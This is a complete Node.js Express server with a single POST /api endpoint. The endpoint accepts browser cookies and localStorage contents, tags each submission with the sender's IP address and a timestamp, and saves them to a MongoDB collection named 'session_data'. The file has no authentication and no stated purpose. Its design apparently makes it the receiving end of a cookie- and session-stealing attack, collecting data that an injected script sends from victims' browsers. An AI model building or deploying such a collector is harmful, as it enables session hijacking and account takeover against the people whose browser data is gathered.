const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
const port = 3009;

mongoose.connect('mongodb://localhost:27017/session_data', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));

const sessionDataSchema = new mongoose.Schema({
  cookies: Object,
  localStorage: Object,
  ipAddress: String,
  timestamp: { type: Date, default: Date.now }
});

const SessionData = mongoose.model('SessionData', sessionDataSchema);

app.use(bodyParser.json({ limit: '10mb' }));

app.post('/api', (req, res) => {
  console.log('Received data:', req.body);

  const sessionData = new SessionData({
    cookies: req.body.cookies,
    localStorage: req.body.localStorage,
    ipAddress: req.ip,
  });

  // Save the document to MongoDB
  sessionData.save()
    .then(() => {
      console.log('Data saved to MongoDB successfully');
      res.status(200).send('Data received and saved successfully');
    })
    .catch((err) => {
      console.error('Error saving data to MongoDB:', err);
      res.status(500).send('Error saving data to MongoDB');
    });

});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
